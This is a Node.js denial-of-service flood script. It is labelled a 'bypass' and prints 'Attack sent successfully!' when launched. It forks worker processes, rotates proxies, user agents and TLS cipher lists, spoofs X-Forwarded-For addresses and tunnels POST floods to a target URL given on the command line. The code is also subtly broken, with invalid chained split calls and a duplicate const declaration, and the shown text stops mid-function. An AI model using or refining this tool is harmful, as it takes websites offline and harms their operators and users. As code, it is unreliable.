
const fs = require('fs');
const url = require('url');
const randstr = require('randomstring'); 
const path = require('path');
const cluster = require('cluster');
const http2 = require('http2'); 
const { cookie } = require('request');

let fileName = __filename;
let file = path.basename(fileName);
let headerbuilders;
let COOKIES; 
let POSTDATA;
let log = '';

if (process.argv.length < 10) {
  console.clear();
  console.log('Failure : Incorrect command line arguments'.red);
  process.exit(0);
}

let randomparam = false;
let proxies = fs.readFileSync('http.txt', 'utf-8').split(/\r/g).split('\n');
let UAs = fs.readFileSync('ua.txt', 'utf-8').split(/\r/g).split('\n');
let rate = process.argv[5];
let target_url = process.argv[3];
const target = target_url.split('""')[0];

process.argv.forEach(arg => {
  if (arg.includes('cookie=')) {
    if (!process.argv[2].split('""')[0].includes(arg)) {
        COOKIES = arg.slice(7);
    } 
  } else if (arg.includes('postdata=')) {
    if (!process.argv[2].split('""')[0].includes(arg)) {
      process.argv[2].toUpperCase() != 'POST' && (console.clear(), process.exit(1));
      POSTDATA = arg.slice(9);
    }
  } else if (arg.includes('randomstring=')) {
    randomparam = arg.slice(13);
    console.log('');
  } else if (arg.includes('headerdata=')) {
    headerbuilders = {
      'Cache-Control': 'max-age=0',
      'Referer': target,
      'X-Forwarded-For': spoof(),
      'Cookie': COOKIES,
      ':method': 'GET'
    };
    if (arg.slice(11).split('""')[0].includes('&')) {
      const headers = arg.slice(11).split('""')[0].split('&');
      for (let i = 0; i < headers.length; i++) {
        const header = headers[i].split('=');
        const name = header[0];
        const value = header[1];
        headerbuilders[name] = value;
      }
    } else {
      const header = arg.slice(11).split('""')[0].split('=');
      const name = header[0];
      const value = header[1];
      headerbuilders[name] = value;
    }
  }
});

COOKIES !== undefined ? console.log('CUSTOM COOKIE'.green) : COOKIES = ''; 
POSTDATA !== undefined ? console.log('CUSTOM') : POSTDATA = '';
if (headerbuilders !== undefined) {
  console.log('');
  const proxies_total = proxies.length - 2;
  const ua_total = UAs.length - 2;
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[6]; i++) {
      cluster.fork();
    }
    if (process.argv[8] == 'n') var result = '随机数字';
    else var result = '随机字母';
    setTimeout(() => {
      process.exit(1);
    }, process.argv[4] * 1000);
  } else startflood(); 
} else {
  headerbuilders = {
    'Cache-Control': 'max-age=0',
    'Referer': target,
    'X-Forwarded-For': spoof(),
    'Cookie': COOKIES,
    ':method': 'POST'
  };
  const proxies_total = proxies.length - 2;
  const ua_total = UAs.length - 2;
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[6]; i++) {
      cluster.fork();
    }
    if (process.argv[8] == 'n') var result = '随机数字';
    else var result = '随机字母';
    console.clear();
    console.log(('SUCCESS : Attack sent successfully!    ').yellow);
    console.log(('MODE : ' + process.argv[2]).toUpperCase());
    console.log(('Target : ' + process.argv[3]).green);
    console.log(('Duration : ' + process.argv[4]).cyan); 
    console.log(('Threads : ' + process.argv[6]).blue);
    console.log(('RQS/S : ' + process.argv[5]).red);
    console.log('delay : ' + process.argv[9]);
    console.log('season max timeout(default 30000):' + process.argv[10]);
    console.log('bypass made by braza'.bgRed.white);
    setTimeout(() => {
      process.exit(1);
    }, process.argv[4] * 1000);
  } else startflood(); 
}

var parsed = url.parse(target);
process.setMaxListeners(0);
if (process.argv[8] == 'n') {
  function ra() {
    const rand = randstr.generate({
      charset: '0123456789',
      length: process.argv[7]
    });
    return rand;
  } 
} else {
  function ra() {
    const rand = randstr.generate({
      charset: 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890', 
      length: process.argv[7]
    });
    return rand;
  }
}

function spoof() {
  return '' + randstr.generate({length: 1, charset: '12'}) + 
    randstr.generate({length: 1, charset: 'abcdef'}) + 
    randstr.generate({length: 1, charset: 'abcdef'}) + '.' + 
    randstr.generate({length: 1, charset: '12'}) + 
    randstr.generate({length: 1, charset: 'abcdef'}) + 
    randstr.generate({length: 1, charset: '012345'}) + '.' + 
    randstr.generate({length: 1, charset: '12'}) + 
    randstr.generate({length: 1, charset: 'abcdef'}) + 
    randstr.generate({length: 1, charset: 'abcdef'}) + '.' + 
    randstr.generate({length: 1, charset: '12'}) + 
    randstr.generate({length: 1, charset: '012345'}) + 
    randstr.generate({length: 1, charset: 'abcdef'});
}

const cplist = [
  'ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:HIGH:!MD5:!aNULL:!EDH', 
  'TLS-AES-256-GCM-SHA384:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS1.3-AES128-GCM-SHA256',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:HIGH:!MD5:!aNULL:!EDH', 
  'TLS-AES-128-GCM-SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256',
  'TLS-CHACHA20-POLY1305-SHA256:HIGH:!MD5:!aNULL:!EDH:!AESGCM:!CAMELLIA:!3DES:TLS13-AES128-GCM-SHA256'
];

function startflood() {
  if (process.argv[2].toUpperCase() == 'POST') {
    const path = url.parse(target).path.replace(/\[rand\]/, ra());
    headerbuilders[':method'] = 'POST';
    headerbuilders['Content-Type'] = 'application/x-www-form-urlencoded';
    randomparam ? 
    setInterval(() => {
      headerbuilders['User-agent'] = UAs[Math.floor(Math.random() * UAs.length)];
      let cipher = cplist[Math.floor(Math.random() * cplist.length)];
      let proxy = proxies[Math.floor(Math.random() * proxies.length)];
      proxy = proxy.split(':');
      const req = require('https');
      const tls = require('tls');
      tls.DEFAULT_MAX_VERSION = 'TLSv1.3';
      const req = req.request({
        host: proxy[0], 
        port: proxy[1],
        ciphers: cipher,
        method: 'CONNECT',
        path: parsed.host + ':443'
      }, () => {
        req.end();
        return;
      });